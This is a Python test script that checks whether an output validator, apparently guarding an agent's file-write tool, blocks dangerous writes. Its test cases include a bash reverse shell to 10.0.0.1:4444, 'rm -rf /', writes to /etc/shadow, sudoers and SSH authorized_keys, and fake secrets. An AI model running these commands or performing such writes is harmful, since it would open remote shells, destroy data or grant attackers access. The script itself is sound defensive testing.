#!/usr/bin/env python3
"""
Test Write Validator
====================

Simple test script to verify the write validator catches dangerous patterns.
"""

import asyncio
import sys
from pathlib import Path

# Add apps/backend to path
current_dir = Path(__file__).parent.parent.parent.parent.parent.parent
backend_dir = current_dir / "apps" / "backend"
sys.path.insert(0, str(backend_dir))

from security.output_validation.models import OutputValidationConfig
from security.output_validation.pattern_detector import create_pattern_detector
from security.output_validation.rules import get_default_rules
from security.output_validation.validators.write_validator import validate_write


async def test_write_validator():
    """Test the write validator with various scenarios."""
    print("Testing Write Validator\n" + "=" * 50)

    # Create detector and load rules
    detector = create_pattern_detector()
    detector.add_rules(get_default_rules())
    config = OutputValidationConfig()

    test_cases = [
        # (description, tool_input, should_be_blocked)
        (
            "Write to /etc/passwd (CRITICAL)",
            {"file_path": "/etc/passwd", "content": "root:x:0:0:root:/root:/bin/bash"},
            True,
        ),
        (
            "Write to /etc/shadow (CRITICAL)",
            {"file_path": "/etc/shadow", "content": "root:$6$hash..."},
            True,
        ),
        (
            "Write to /usr/bin (CRITICAL)",
            {"file_path": "/usr/bin/malicious", "content": "#!/bin/bash\nrm -rf /"},
            True,
        ),
        (
            "Write to SSH authorized_keys (HIGH)",
            {"file_path": "/home/user/.ssh/authorized_keys", "content": "ssh-rsa AAAA..."},
            True,
        ),
        (
            "Write to sudoers file (CRITICAL)",
            {"file_path": "/etc/sudoers", "content": "root ALL=(ALL:ALL) ALL"},
            True,
        ),
        (
            "Write with API key (CRITICAL)",
            {"file_path": "/app/config.py", "content": "API_KEY = 'sk-1234567890abcdefghijklmnop'"},
            True,
        ),
        (
            "Write with AWS key (CRITICAL)",
            {"file_path": "/app/.env", "content": "aws_access_key_id=AKIA1234567890123456"},
            True,
        ),
        (
            "Write with private key (CRITICAL)",
            {"file_path": "/app/id_rsa", "content": "-----BEGIN RSA PRIVATE KEY-----\n..."},
            True,
        ),
        (
            "Write with eval code (HIGH)",
            {"file_path": "/app/script.py", "content": "eval(os.getenv('code'))"},
            True,
        ),
        (
            "Write with reverse shell (CRITICAL)",
            {"file_path": "/app/shell.sh", "content": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
            True,
        ),
        (
            "Write to .env file (MEDIUM) - allowed by default",
            {"file_path": "/app/.env", "content": "DEBUG=true\nDATABASE_URL=postgres://localhost"},
            False,  # MEDIUM severity only blocks in strict mode
        ),
        (
            "Safe write to README (ALLOW)",
            {"file_path": "/app/README.md", "content": "# My Project\n\nThis is a safe file."},
            False,
        ),
        (
            "Safe write to source code (ALLOW)",
            {"file_path": "/app/main.py", "content": "def main():\n    print('Hello, World!')"},
            False,
        ),
    ]

    passed = 0
    failed = 0

    for description, tool_input, should_be_blocked in test_cases:
        result = await validate_write(
            tool_input=tool_input,
            detector=detector,
            config=config,
        )

        is_blocked = result.is_blocked

        if is_blocked == should_be_blocked:
            status = "✓ PASS"
            passed += 1
        else:
            status = "✗ FAIL"
            failed += 1

        print(f"\n{status}: {description}")
        print(f"  File: {tool_input['file_path']}")
        print(f"  Expected: {'BLOCK' if should_be_blocked else 'ALLOW'}")
        print(f"  Got: {'BLOCK' if is_blocked else 'ALLOW'}")

        if is_blocked:
            print(f"  Rule: {result.rule_id}")
            print(f"  Reason: {result.reason[:80]}...")

    print("\n" + "=" * 50)
    print(f"Results: {passed} passed, {failed} failed")

    return failed == 0


if __name__ == "__main__":
    success = asyncio.run(test_write_validator())
    sys.exit(0 if success else 1)
